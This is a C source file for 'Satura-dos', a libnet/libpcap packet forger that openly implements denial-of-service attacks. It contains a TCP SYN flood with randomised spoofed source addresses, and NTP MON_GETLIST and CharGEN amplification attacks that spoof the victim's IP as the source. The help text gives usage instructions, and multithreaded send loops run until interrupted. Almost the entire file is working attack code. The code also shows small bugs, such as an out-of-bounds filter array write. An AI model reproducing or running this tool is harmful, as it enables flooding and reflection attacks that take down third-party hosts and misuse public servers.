/*
* Project: Satura-dos
* It's a packet forger that implement some well know denial of service attacks on OSI layer 4
* The packet forger is built with libnet and libpcap (for packet capturing)
* ###########################################################################################
*
* Libnet Hints:
* Build the packet from the highet level. Ex.
*	1. libnet_build_ntp()
*	2. libnet_build_udp()
*	3. libnet_build_ipv4()
*	4. libnet_build_ethernet()
*/

/*
* To avoid compiling warning "_BSD_SOURCE and _SVID_SOURCE are deprecated
*/
#define _DEFAULT_SOURCE

/*
* Preprocessor Macro:
* https://www.gnu.org/software/libc/manual/html_node/Feature-Test-Macros.html
*/

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

/*
* Libnet provides a portable framework for low-level network packet construction
* https://github.com/sam-github/libnet
*/
#include <libnet.h>

/*
* Pcap Library
* http://www.tcpdump.org/pcap.html
*/
#include <pcap.h>

#include <unistd.h>

/*
* getifaddrs : list available network interfaces
* int getifaddrs(struct ifaddrs **ifap);
* void freeifaddrs(struct ifaddrs *ifa);
*/
#include <sys/types.h>
#include <ifaddrs.h>

/*
* getnameinfo : address-to-name  translation  in protocol-independent manner
* int getnameinfo(const struct sockaddr *sa, socklen_t salen,
*                       char *host, socklen_t hostlen,
*                       char *serv, socklen_t servlen, int flags);
*/
#include <sys/socket.h>
#include <netdb.h>

/*
* Declaration for getopt long
* http://linux.die.net/include/getopt.h
*/
#include <getopt.h>

#include <time.h>
#include <signal.h>
#include <pthread.h>

/* for packet structure */
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

//#include <netinet/if_ether.h> 	/* includes net/ethernet.h */
//#include <netinet/ip.h> 			/*ip definition */
//#include <netinet/tcp.h> 			/*tcp definition */
/*
* Colored output from https://stackoverflow.com/questions/3219393/stdlib-and-colored-output-in-c
* ex: printf(ANSI_COLOR_RED "This text is RED!" ANSI_COLOR_RESET "\n");
*/

#define ANSI_COLOR_RED     "\x1b[31m"
#define ANSI_COLOR_GREEN   "\x1b[32m"
#define ANSI_COLOR_YELLOW  "\x1b[33m"
#define ANSI_COLOR_BLUE    "\x1b[34m"
#define ANSI_COLOR_MAGENTA "\x1b[35m"
#define ANSI_COLOR_CYAN    "\x1b[36m"
#define ANSI_COLOR_RESET   "\x1b[0m"

/* #################### PCAP packet header definition ############### */

/* Ethernet header */
/* ether definition from net/ethernet.h copy&paste */

#define SIZE_ETHERNET 14
/* Ethernet addresses are 6 bytes */
#define ETHER_ADDR_LENG	6

/* Ethernet header */
struct eth_packet {
        uint8_t  ether_dhost[ETHER_ADDR_LENG];    /* destination host address */
        uint8_t  ether_shost[ETHER_ADDR_LENG];    /* source host address */
        uint16_t ether_type;                     /* IP? ARP? RARP? etc */
};

/* IPv4 definition from netinet/ip.h copy&paste */

struct ip_packet{
#if __BYTE_ORDER == __LITTLE_ENDIAN
    uint8_t ip_hl:4,						/* header length */
     ip_v:4;								/* version */
#endif
#if __BYTE_ORDER == __BIG_ENDIAN
    uint8_t ip_v:4,							/* version */
     ip_hl:4;								/* header length */
#endif
    uint8_t ip_tos;							/* type of service */
    uint16_t ip_len;						/* total length */
    uint16_t ip_id;							/* identification */
    uint16_t ip_off;						/* fragment offset field */
#define	IP_RF 0x8000						/* reserved fragment flag */
#define	IP_DF 0x4000						/* dont fragment flag */
#define	IP_MF 0x2000						/* more fragments flag */
#define	IP_OFFMASK 0x1fff					/* mask for fragmenting bits */
    uint8_t ip_ttl;							/* time to live */
    uint8_t ip_p;							/* protocol */
    uint16_t ip_sum;						/* checksum */
    struct in_addr ip_src;					/* source  address */
    struct in_addr ip_dst;					/*  dest address */
 };
/*
 * TCP header.
 * Per RFC 793, September, 1981. from netinet/tcp.h
 */
typedef	uint32_t tcp_seq;
struct tcp_packet{
    uint16_t th_sport;					/* source port */
    uint16_t th_dport;					/* destination port */
    tcp_seq th_seq;						/* sequence number */
    tcp_seq th_ack;						/* acknowledgement number */
#if __BYTE_ORDER == __LITTLE_ENDIAN
    uint8_t th_x2:4,					/* (unused) */
	th_off:4;							/* data offset */
#endif
#if __BYTE_ORDER == __BIG_ENDIAN
    uint8_t th_off:4,					/* data offset */
 	th_x2:4;							/* (unused) */
#endif
    uint8_t th_flags;
#define TH_FIN	0x01
#define TH_SYN	0x02
#define TH_RST	0x04
#define TH_PUSH	0x08
#define TH_ACK	0x10
#define TH_URG	0x20
#define TH_ECE  0x40
#define TH_CWR  0x80
#define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_PUSH|TH_ACK|TH_URG|TH_ECE|TH_CWR)
    uint16_t th_win;					/* window */
    uint16_t th_sum;					/* checksum */
    uint16_t th_urp;					/* urgent pointer */
};

/*
* UDP protocol header.
* Per RFC 768, September, 1981. netinet/udp.h
*/
struct udp_packet{
        uint16_t uh_sport;			/* source port */
        uint16_t uh_dport;			/* destination port */
        uint16_t uh_ulen;			/* length of user datagram */
        uint16_t uh_sum;			/* checksum */
};

/* #################### END packet header definition from tcpdump.org */

void print_banner();
void print_help() {
	printf("Satura-dos options:\n");
	printf("\t-i inteface ex. -i eth0. Default auto\n");
	printf("\t-l list available intefaces\n");
	printf("\t-s Source IP address. Default random!\n");
	printf("\t-r Source port. Default random!\n");
	printf("\t-t Target IP address.\n");
	printf("\t-p Target port. \n");
	printf("\t-T Time delay in milliseconds (1 - 1000ms). Default 1000ms (1 sec) \n");
	printf("\t-e Add an exception to a parameter. Different from each attack\n");
	printf("\t-V Super Verbouse Mode: Start libpcap and printf sent packet.\n");
	printf("\t-h -? this help\n");
	printf("\t-v Print libnet version\n");
	printf("\n");
	printf(ANSI_COLOR_YELLOW "\t---------------------------- ATTACKS -----------------------------" ANSI_COLOR_RESET "\n");
	printf("\n");
	printf("\t-a 1 : Invalid TCP SYN flood attack (NEW) + Random Payload\n");
	printf("\t  -e : Force the program to forge packet from source port 0\n");
	printf("\t       need to be provided trough -r option)\n");
	printf("\n");
	printf("\t-a 2 : NTP amplification DoS attack VU#348126 (ntpd prior to 4.2.7)\n");
	printf("\t       Usage: -s [Spoofed IP (victim)] -t [NTP Server IP] -p 123\n");
	printf("\n");
	printf("\t-a 3 : CharGEN Character generation request amplification DoS attack \n");
	printf("\t       Usage: -s [Spoofed IP (victim)] -t [CharGEN Server IP] -p 19\n");
	exit(EXIT_SUCCESS);

}

int32_t list_available_interfaces();

/* my packet headers structure */
typedef struct packet_headers{
	uint32_t src_ip_addr;
	uint32_t dst_ip_addr;
	uint8_t *src_mac_addr;
	uint8_t *dst_mac_addr;
	uint16_t src_port;
	uint16_t dst_port;
} packet_header;

/* struct arguments for pthread */
struct pth_arg{
		libnet_t *pt_handle;		/* libnet sessione handler */
		packet_header pt_packet;	/* my packet in strucuture */
		int pt_except;				/* the -e argument */
		struct sigaction pt_act;	/* the signal for catch ctrl+c*/
		int pt_payload_selector;	/* payload selector fro udp attacks*/
		int delay;					/* delay between packets -T argument*/
};

/* DoS Functions */
//void forge_syn_attack(libnet_t *lib, packet_header syn_packet,  int Pexcept, struct sigaction act);
void *forge_syn_attack(void *forge_par);
//void forge_UDP_attacks(libnet_t *lib, packet_header ntp_packet, int Pexcept, struct sigaction act);
void *forge_UDP_attacks(void *forge_par);

/* sigaction signal */
static int ctrlc = 1;
void catch_ctrlc(){
	ctrlc = 0;
}

#define CLOCK_PRECISION 1E9 /* one billion */
/*global packet counter*/
static uint64_t cc=0;

void got_packet(uint8_t *args,const struct pcap_pkthdr *header, const uint8_t *packet){
	const struct eth_packet *ethernet;  	/* The ethernet header*/
	const struct ip_packet *ip;              /* The IP header */
	const struct tcp_packet *tcp;            /* The TCP header */
	const struct udp_packet *udp;            /* The UDP header */

	/* typecasting for dissect the packets  */

	/* define ethernet header */
	ethernet = (struct eth_packet*)(packet);

	/* define/compute ip header offset */
	ip = (struct ip_packet*)(packet + SIZE_ETHERNET);
	/* Note for inet_ntoa: The string is returned in a statically allocated buffer, which subsequent calls will overwrite. */
	char *aux = inet_ntoa(ip->ip_src);
	char *s_ip=malloc(sizeof(aux+1));
	strcpy(s_ip, aux);
	aux = inet_ntoa(ip->ip_dst);
	char *d_ip=malloc(sizeof(aux+1));
	strcpy(d_ip, aux);
	/* determine protocol */
	switch(ip->ip_p) {
		case IPPROTO_TCP: /* from netinet/in.h */
			tcp = (struct tcp_packet*)(packet + SIZE_ETHERNET + 20);
			printf("TCP Packet from "ANSI_COLOR_GREEN"%s"ANSI_COLOR_RESET":"ANSI_COLOR_CYAN"%d"ANSI_COLOR_RESET" to "ANSI_COLOR_YELLOW"%s"ANSI_COLOR_RESET":"ANSI_COLOR_CYAN"%d"ANSI_COLOR_RESET" ack number: %lu\n",s_ip,ntohs(tcp->th_sport),d_ip,ntohs(tcp->th_dport),tcp->th_ack);
			return;
		case IPPROTO_UDP: /* from netinet/in.h */
			udp = (struct udp_packet*)(packet + SIZE_ETHERNET + 20);
			printf("UDP Packet from "ANSI_COLOR_GREEN"%s"ANSI_COLOR_RESET":"ANSI_COLOR_CYAN"%d"ANSI_COLOR_RESET" to "ANSI_COLOR_YELLOW"%s"ANSI_COLOR_RESET":"ANSI_COLOR_CYAN"%d"ANSI_COLOR_RESET"\n",s_ip,ntohs(udp->uh_sport),d_ip,ntohs(udp->uh_dport) );
			return;
		default:
			printf("No packet rule matching !\n");
			return;
	}
	free(d_ip);
	free(s_ip);
	return;
}

int main (int argc, char *argv[]) {
	libnet_t *l = NULL;  								/* the 'libnet context', basically all the stuff in memory */
	pcap_t *p_handle = NULL; 							/* the 'libpcap context' */
	char pcap_errbuf[PCAP_ERRBUF_SIZE]; 				/* libpcap error buffer*/
	char errbuf[LIBNET_ERRBUF_SIZE]; 					/* libnet error buffer */

	/* Pcap filters stuff */
	char *pcap_filters[3];								/* Packet filters based on attacks */
	struct bpf_program fp;								/* The compiled filter expression */
	bpf_u_int32 mask;									/* The netmask of our sniffing device */
	bpf_u_int32 net;									/* The IP of our sniffing device */

	struct sigaction myact;								/* struct for catch ctrl+c */

	/* Thread stuff */
	struct pth_arg pth_args; 							/* struct arguments for pthread */
	pthread_t my_thread1,my_thread2 ;					/* my threads */
	int iret_1, iret_2;									/* thread return int */

	int_fast32_t c, attacks = 0;
	char * interface = NULL, * pcap_device = NULL; 		/* pcap_device is used only if not interface provided*/
  	packet_header mypacket; 							/* my packets */

  	char *src_ip_addr_str = NULL, *dst_ip_addr_str = NULL;

  	/* Timing */
  	struct timespec proc_start, proc_end;
  	double total_proc_time; /*,*/

  	/* init */
  	mypacket.src_ip_addr = 0;
  	mypacket.dst_ip_addr = 0;
  	mypacket.src_port = 0;
  	mypacket.dst_port = 0;
	int myexcept = 0, use_pcap=0;
	uint32_t msec;
	myact.sa_handler = catch_ctrlc; /* catch events function name*/

	/* Set filters http://www.cs.ucr.edu/~marios/ethereal-tcpdump.pdf */
	pcap_filters[0] = "ip";
	pcap_filters[1] = "tcp[tcpflags] & tcp-syn !=0"; 	/* The syn flood filter expression - tcp[tcpflags] & tcp-syn !=0 */
	pcap_filters[2] = "udp && dst port 123"; 				/* The ntp dos filter expression */
	pcap_filters[3] = "udp && dst port 19"; 				/* The chargen dos filter expression */

	c = 0;
	while ( (c = getopt(argc, argv, "eT:i::s:d:m:a:p:r:t:l?hvV") ) != -1) { /* :: means optional */ //# TODO: convertire getopt in getopt_long
		if (optind > argc) {
		fprintf(stderr, "Too many arguments after options\n");
		exit(EXIT_FAILURE); }
		switch(c) {
			case 'i':
				interface = optarg;
				break;
			case 's':
				src_ip_addr_str = optarg;
				break;
			case 't':
				dst_ip_addr_str = optarg;
				break;
			case 'p':
				mypacket.dst_port = (uint16_t)atoi(optarg);
				break;
			case 'r':
				mypacket.src_port = (uint16_t)atoi(optarg);
				break;
			case 'e':
				myexcept = 1;
				break;
			case 'a':
				attacks = (int32_t)atoi(optarg);
				break;
			case 'l':
				list_available_interfaces();
				exit(EXIT_SUCCESS);
			case 'T':
				msec = (int32_t)atoi(optarg);
				msec = ((msec == 0) || (msec > 1000)) ? 1000000 : msec*1000;
				break;
			case 'V':
				use_pcap = 1;
				break;
			case 'v':
				printf("Libnet version: %s\n",libnet_version());
				exit(EXIT_SUCCESS);
			case '?':
				print_help();
			case 'h':
				print_help();
			default:
				print_help();
			}
	}
	print_banner();
	if(!mypacket.dst_port || !dst_ip_addr_str || !attacks){
		fprintf(stderr, "\nERROR: No destination port or ip address or attacks provided\n\n");
		print_help();
		exit(EXIT_FAILURE); }

	/* Check the interface, if not libnet select the interface automatically */
	if (interface != NULL){
		l = libnet_init(LIBNET_RAW4, interface, errbuf);
		if (l == NULL) {
			fprintf(stderr, "Libnet() init fail%s\n",errbuf); exit(EXIT_FAILURE);
		}
		if (use_pcap == 1){
			/* pcap_t *pcap_open_live(char *device, int snaplen, int promisc, int to_ms, char *ebuf)
			* BUFFSIZ: defined in pcap.h
			* int promisc: if promiscuous mode
			* to_ms: sniffing waiting
			* pcap_errbuf: error buffer
			*/
			p_handle = pcap_open_live(interface, BUFSIZ, 0, 100, pcap_errbuf);
			if (p_handle == NULL){
				fprintf(stderr, "Couldn't open device %s: %s\n", interface, pcap_errbuf);exit(EXIT_FAILURE);
			}
		}

	}
	else {
		printf("["ANSI_COLOR_GREEN"*"ANSI_COLOR_RESET"] Auto Selected interface\n");
		l = libnet_init(LIBNET_RAW4, NULL, errbuf); /* NULL = auto*/
		if (l == NULL) {
			fprintf(stderr, "Libnet() init fail%s\n",errbuf); exit(EXIT_FAILURE);
		}
		if (use_pcap == 1){
			pcap_device = pcap_lookupdev(pcap_errbuf);
			if (pcap_device == NULL) {
				fprintf(stderr, "Couldn't find default device: %s\n", pcap_errbuf);exit(EXIT_FAILURE);
			}
			p_handle = pcap_open_live(pcap_device, BUFSIZ, 0, 100, pcap_errbuf);
			if (p_handle == NULL){
				fprintf(stderr, "Couldn't open device %s: %s\n", pcap_device, pcap_errbuf);exit(EXIT_FAILURE);
			}

		}
	}

	/* if no argument is provided get ip from interface
	* otherwise get the given source ip
	* libnet_name2addr4 returns the address in network order (big endian).
	*/
	if (src_ip_addr_str != NULL){
		if ((mypacket.src_ip_addr = libnet_name2addr4(l, src_ip_addr_str, LIBNET_DONT_RESOLVE) ) == -1){
		fprintf(stderr, "Couldn't get provided source ip ( -s ): %s\n",libnet_geterror(l) );
		exit(EXIT_FAILURE);
		}
	}

	if ((mypacket.dst_ip_addr = libnet_name2addr4(l, dst_ip_addr_str, LIBNET_DONT_RESOLVE)) == -1 ){
		fprintf(stderr, "Couldn't get provided destination ip: %s\n",libnet_geterror(l) );
		exit(EXIT_FAILURE);
	}

	printf("["ANSI_COLOR_GREEN"*"ANSI_COLOR_RESET"] Selected interface "ANSI_COLOR_GREEN "%s"ANSI_COLOR_RESET"\n",((interface == NULL) ? "AUTO" : interface) );

	/* PCAP Initialization */
	if(use_pcap == 1){
		if ( pcap_datalink (p_handle) != DLT_EN10MB){
			fprintf (stderr, "Only Ethernet card supported!\n");
			exit (EXIT_FAILURE);
		}
	/*Find netmask for filter*/
		if (pcap_lookupnet( (pcap_device = (interface == NULL) ? pcap_device : interface), &net, &mask, pcap_errbuf ) == -1){
			fprintf(stderr, "lookupnet fail%s\n",pcap_errbuf );
			net = 0;
			mask = 0;
		}
		/* Compile the filter */
		if (pcap_compile(p_handle, &fp, pcap_filters[attacks], 0, mask) == -1){
			fprintf(stderr, "Pcap compile filter error%s\n",pcap_errbuf );
			exit(EXIT_FAILURE);
		}
		/* Install the filter */
		if (pcap_setfilter(p_handle, &fp) == -1){
			fprintf(stderr, "Pcap set filter error%s\n",pcap_errbuf );
			exit(EXIT_FAILURE);
		}

		pcap_freecode(&fp); /* free the memeory used by BPF programm */

	}
/* #######  */

	/* Fill the arguments for dos functions */
	pth_args.pt_handle = l;						/* libnet handle*/
	pth_args.pt_packet = mypacket;
	pth_args.pt_except = myexcept;
	pth_args.pt_act = myact;
	pth_args.pt_payload_selector = attacks;
	pth_args.delay = msec;

	if( clock_gettime( CLOCK_REALTIME, &proc_start) == -1 ) {
      perror( "clock gettime" ); exit( EXIT_FAILURE );
    }
	switch(attacks){
		case 1:
			printf("["ANSI_COLOR_GREEN "*" ANSI_COLOR_RESET "] Syn FLood attack!\n");
			printf("\nPress "ANSI_COLOR_GREEN "Ctrl+C" ANSI_COLOR_RESET" to stop\n");
			iret_1 = pthread_create(&my_thread1, NULL, &forge_syn_attack, (void *) &pth_args);
			if (iret_1){
				fprintf(stderr, "Error - pthread_create ret code %d\n",iret_1);
				exit(EXIT_FAILURE);
			}
			iret_2 = pthread_create(&my_thread2, NULL, &forge_syn_attack, (void *) &pth_args);
			if (iret_2){
				fprintf(stderr, "Error - pthread_create ret code %d\n",iret_2);
				exit(EXIT_FAILURE);
			}
			break;
		case 2:
			printf("["ANSI_COLOR_GREEN "*" ANSI_COLOR_RESET "] NTP amplified DoS attack!\n");
			printf("\nPress "ANSI_COLOR_GREEN "Ctrl+C" ANSI_COLOR_RESET" to stop\n");
			iret_1 = pthread_create(&my_thread1, NULL, &forge_UDP_attacks, (void *) &pth_args);
			if (iret_1){
				fprintf(stderr, "Error - pthread_create ret code %d\n",iret_1);
				exit(EXIT_FAILURE);
			}
			iret_2 = pthread_create(&my_thread2, NULL, &forge_UDP_attacks, (void *) &pth_args);
			if (iret_2){
				fprintf(stderr, "Error - pthread_create ret code %d\n",iret_2);
				exit(EXIT_FAILURE);
			}
			break;
		case 3:
			printf("["ANSI_COLOR_GREEN "*" ANSI_COLOR_RESET "] CharGEN amplified DoS attack!\n");
			printf("\nPress "ANSI_COLOR_GREEN "Ctrl+C" ANSI_COLOR_RESET" to stop\n");
			iret_1 = pthread_create(&my_thread1, NULL, &forge_UDP_attacks, (void *) &pth_args);
			if (iret_1){
				fprintf(stderr, "Error - pthread_create ret code %d\n",iret_1);
				exit(EXIT_FAILURE);
			}
			iret_2 = pthread_create(&my_thread2, NULL, &forge_UDP_attacks, (void *) &pth_args);
			if (iret_2){
				fprintf(stderr, "Error - pthread_create ret code %d\n",iret_2);
				exit(EXIT_FAILURE);
			}
			break;
		default:
			exit(EXIT_FAILURE);
		}
	/*little dirty trick to control the pcap loop*/
	if(use_pcap==1){
		while(ctrlc){
			pcap_dispatch(p_handle, 1, got_packet, NULL);
			pcap_breakloop(p_handle);
		}

	}
	pthread_join(my_thread1, NULL); /* wait for termination of thread process */
	pthread_join(my_thread2, NULL); /* wait for termination of thread process */

	if( clock_gettime( CLOCK_REALTIME, &proc_end) == -1 ) { /*add -lrt to makefile*/
      perror( "clock gettime" );exit( EXIT_FAILURE );
    }
    total_proc_time = ( proc_end.tv_sec - proc_start.tv_sec ) + ( proc_end.tv_nsec - proc_start.tv_nsec ) / CLOCK_PRECISION;
	printf("\nSent %lu packets in %.2lf seconds\n\n",cc, total_proc_time);

	/* Clean up and exit */
	if(use_pcap == 1) {
		pcap_freecode(&fp);
		pcap_close(p_handle);
	}
	libnet_destroy(l);
	return (EXIT_SUCCESS);

}

int32_t list_available_interfaces() {
	struct ifaddrs *ifaddr, *ifa; /* for getifaddrs() */
	int_fast32_t n;
	int32_t family;
	/* Initialize getifaddrs() */
	if (getifaddrs(&ifaddr) == -1) {
		perror("getifaddrs says");
		exit(EXIT_FAILURE); /* more portable instead of exit(0) */
	}
	/* Search through the linked list, save the pointer on ifaddr */
	printf("Available Network interface :\n");
	for (ifa = ifaddr, n = 0; ifa != NULL; ifa = ifa->ifa_next, n++) {
		if (ifa->ifa_addr == NULL)
			continue;
		/*
		* Check if net interfaces are ipv6 or ipv4
		* ifaddr in defined as struct sockaddr, sockaddr have "sa_family": address family, AF_xxx
		* AF_xxx are defined in sys/socket.h
		*/
		family = ifa->ifa_addr->sa_family;
		if(family == AF_INET) printf("IPv4 type -> \t%s\n",ifa->ifa_name);

	}
	/* free the pointer */
	freeifaddrs(ifaddr);
	return 0;
}
void print_banner() {
	printf(ANSI_COLOR_MAGENTA "     _______.     ___   .___________. __    __  .______          ___          _______   ______        _______." ANSI_COLOR_RESET "\n");
	printf(ANSI_COLOR_MAGENTA "    /       |    /   \\  |           ||  |  |  | |   _  \\        /   \\        |       \\ /  __  \\      /       |" ANSI_COLOR_RESET "\n");
	printf(ANSI_COLOR_MAGENTA "   |   (----`   /  ^  \\ `---|  |----`|  |  |  | |  |_)  |      /  ^  \\       |  .--.  |  |  |  |    |   (----`" ANSI_COLOR_RESET "\n");
	printf(ANSI_COLOR_MAGENTA "    \\   \\      /  /_\\  \\    |  |     |  |  |  | |      /      /  /_\\  \\      |  |  |  |  |  |  |     \\   \\    " ANSI_COLOR_RESET "\n");
	printf(ANSI_COLOR_MAGENTA ".----)   |    /  _____  \\   |  |     |  `--'  | |  |\\  \\----./  _____  \\     |  '--'  |  `--'  | .----)   |   " ANSI_COLOR_RESET "\n");
	printf(ANSI_COLOR_MAGENTA "|_______/    /__/     \\__\\  |__|      \\______/  | _| `._____/__/     \\__\\    |_______/ \\______/  |_______/    " ANSI_COLOR_RESET "\n");
	printf("\n");
}

//void forge_syn_attack(libnet_t *lib, packet_header syn_packet, int Pexcept, struct sigaction act){
void *forge_syn_attack(void *forge_par){
	struct pth_arg *S_pth_arg = (struct pth_arg *)forge_par; /*wrap to wrap to wrap to cast to wrap.......*/

	libnet_ptag_t tcp_tag, ip_tag; /* protocol tag value */
	int32_t c = 0;

	int randP = 0, randIP = 0;

	char TCP_payloadR[16]; /*random payload*/
	libnet_seed_prand(S_pth_arg->pt_handle); /* function to seed the pseudo-random number generator */
	tcp_tag = ip_tag = LIBNET_PTAG_INITIALIZER; /*initialize the protocol tags*/

	uint8_t *src_ip_addr_p = NULL, *dst_ip_addr_p = NULL;

	randIP = (S_pth_arg->pt_packet.src_ip_addr == 0) ? 1 : 0;
	randP = ((S_pth_arg->pt_except == 0) && (S_pth_arg->pt_packet.src_port == 0)) ? 1 : 0;
	sigaction(SIGINT, &S_pth_arg->pt_act, NULL); /*catch le ctrl+c safely*/

	 while(ctrlc){
	 	/*Generate random payload*/
		for (int d = 0; d < sizeof(TCP_payloadR); d++){
			/*convert random number 0-225 to hex string like 6f */
			snprintf(&TCP_payloadR[d], sizeof(char)*4, "%02x",(uint8_t)libnet_get_prand(LIBNET_PR8) );
			/*string to byte value 6f=>0x6f*/
			TCP_payloadR[d] = ((uint8_t)strtol(&TCP_payloadR[d],NULL,16));
		}
		S_pth_arg->pt_packet.src_port = (randP == 1) ? libnet_get_prand(LIBNET_PRu16) : S_pth_arg->pt_packet.src_port;
		/*
		* Trick from repolinux: cast a pointer to a 4 byte integer into a pointer to an array of 4 single bytes.
        */
        src_ip_addr_p = (uint8_t*)(&S_pth_arg->pt_packet.src_ip_addr);
        dst_ip_addr_p = (uint8_t*)(&S_pth_arg->pt_packet.dst_ip_addr);
        /*
        * Completely Random Source Address
        * Check if the source addr is 0 (random) or the same of the previous packet
        */
		if (randIP == 1){
			for (int i = 0; i < 4; ++i){
				src_ip_addr_p[i] = (uint8_t)libnet_get_prand(LIBNET_PR8); /* random 0-255 */
			}
		}

		tcp_tag = libnet_build_tcp(
            S_pth_arg->pt_packet.src_port,			/* source port */
            S_pth_arg->pt_packet.dst_port,			/* destination port */
            libnet_get_prand(LIBNET_PRu32),			/* sequence number */
            libnet_get_prand(LIBNET_PRu32),			/* acknowledgement num */
            TH_SYN,									/* control flags */
            0,										/* window size */
            0,										/* checksum 0= AUTOMATIC*/
            0,										/* urgent pointer */
            LIBNET_TCP_H + sizeof(TCP_payloadR),	/* TCP packet size */
            (uint8_t*)TCP_payloadR,					/* payload NULL if empty, it's a pointer*/
            sizeof(TCP_payloadR),					/* payload size 0 if none*/
            S_pth_arg->pt_handle,					/* libnet handle */
            tcp_tag);								/* libnet id tag*/

        if (tcp_tag == -1){
			fprintf(stderr, "Can't build TCP header: %s\n",libnet_geterror(S_pth_arg->pt_handle) );
			libnet_destroy(S_pth_arg->pt_handle);
			exit(EXIT_FAILURE);
		}

    	ip_tag = libnet_build_ipv4(
   			LIBNET_IPV4_H + LIBNET_TCP_H+sizeof(TCP_payloadR), 				/* length */
        	0,											/* TOS */
        	libnet_get_prand(LIBNET_PRu16),				/* IP ID */
        	0,											/* IP Frag */
        	64,											/* TTL */
        	IPPROTO_TCP,								/* protocol */
        	0,											/* checksum, 0 = auto*/
        	S_pth_arg->pt_packet.src_ip_addr,			/* source IP */
        	S_pth_arg->pt_packet.dst_ip_addr,			/* destination IP */
        	NULL,										/* payload */
        	0,		      					   		    /* payload size */
        	S_pth_arg->pt_handle,                       /* libnet context */
        	ip_tag); 	                                /* libnet id */

    	if (ip_tag == -1){
			fprintf(stderr, "Can't build IPv4 header: %s\n",libnet_geterror(S_pth_arg->pt_handle) );
			libnet_destroy(S_pth_arg->pt_handle);
			exit(EXIT_FAILURE);
		}

	    c = libnet_write(S_pth_arg->pt_handle);
        if (c == -1){
            fprintf(stderr, "libnet_write: %s\n", libnet_geterror(S_pth_arg->pt_handle));
            libnet_destroy(S_pth_arg->pt_handle);
            exit(EXIT_FAILURE);
        }
        cc++;
        usleep(S_pth_arg->delay);

	}//end while

	return;
}

//void forge_UDP_attacks(libnet_t *lib, packet_header ntp_packet, int Pexcept, struct sigaction act){
void *forge_UDP_attacks(void *forge_par){
	struct pth_arg *U_pth_arg = (struct pth_arg *)forge_par; /*wrap to wrap to wrap to cast to wrap.......*/
	char *UDP_payload = NULL;
	char NTP_amp_payload[] = {
	0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
	/* NTP MON_GETLIST */
	char CharGEN_amp_payload[128];
	/* chargen random pay*/
	size_t payload_s;
	int32_t c =0;
	libnet_seed_prand(U_pth_arg->pt_handle); /* function to seed the pseudo-random number generator */
	libnet_ptag_t udp_tag, ip_tag; /* protocol tag value */
	/*Generate random payload */
	for (int d = 0; d < sizeof(CharGEN_amp_payload); d++){
		/*convert random number 0-225 to hex string like 6f */
		snprintf(&CharGEN_amp_payload[d], sizeof(char)*4, "%02x",(uint8_t)libnet_get_prand(LIBNET_PR8) );
		/*string to byte value 6f=>0x6f*/
		CharGEN_amp_payload[d] = ((uint8_t)strtol(&CharGEN_amp_payload[d],NULL,16));
	}
	switch(U_pth_arg->pt_payload_selector){
		case 2:
			payload_s = sizeof(NTP_amp_payload);
			UDP_payload = NTP_amp_payload;
		break;
		case 3:
			payload_s = sizeof(CharGEN_amp_payload);
			UDP_payload = CharGEN_amp_payload;
		break;
		default:
		fprintf(stderr, "No payload\n");exit(EXIT_FAILURE);
	}

	udp_tag = ip_tag = LIBNET_PTAG_INITIALIZER; /*initialize the protocol tags*/
	sigaction(SIGINT, &U_pth_arg->pt_act, NULL); /*catch ctrl+c safely*/
	while(ctrlc){
		U_pth_arg->pt_packet.src_port = (U_pth_arg->pt_packet.src_port == 0) ? libnet_get_prand(LIBNET_PRu16) : U_pth_arg->pt_packet.src_port;

        udp_tag = libnet_build_udp(
            U_pth_arg->pt_packet.src_port,          /* source port */
            U_pth_arg->pt_packet.dst_port,          /* destination port */
            LIBNET_UDP_H + payload_s,               /* packet length */
            0,                                      /* checksum */
            (uint8_t*)UDP_payload,		            /* payload */
            payload_s,                              /* payload size */
            U_pth_arg->pt_handle,                   /* libnet handle */
            udp_tag);                               /* libnet id */

        if (udp_tag == -1){
            fprintf(stderr, "Can't build UDP header: %s\n", libnet_geterror(U_pth_arg->pt_handle));
            libnet_destroy(U_pth_arg->pt_handle);
            exit(EXIT_FAILURE);
        }

    	ip_tag = libnet_build_ipv4(
   			LIBNET_IPV4_H + LIBNET_UDP_H + payload_s,	/* length */
        	0,											/* TOS */
        	libnet_get_prand(LIBNET_PRu16),				/* IP ID */
        	0,											/* IP Frag */
        	64,											/* TTL */
        	IPPROTO_UDP,								/* protocol */
        	0,											/* checksum, 0 = auto*/
        	U_pth_arg->pt_packet.src_ip_addr,			/* source IP */
        	U_pth_arg->pt_packet.dst_ip_addr,			/* destination IP */
        	NULL,										/* payload */
        	0,		      					   		    /* payload size */
        	U_pth_arg->pt_handle,                       /* libnet context */
        	ip_tag); 	                                /* libnet id */

    	if (ip_tag == -1){
			fprintf(stderr, "Can't build IPv4 header: %s\n",libnet_geterror(U_pth_arg->pt_handle) );
			libnet_destroy(U_pth_arg->pt_handle);
			exit(EXIT_FAILURE);
		}

	    c = libnet_write(U_pth_arg->pt_handle);
        if (c == -1){
            fprintf(stderr, "libnet_write: %s\n", libnet_geterror(U_pth_arg->pt_handle));
            libnet_destroy(U_pth_arg->pt_handle);
            exit(EXIT_FAILURE);
        }
        cc++;
        usleep(U_pth_arg->delay);

	}//end while

	return;
}
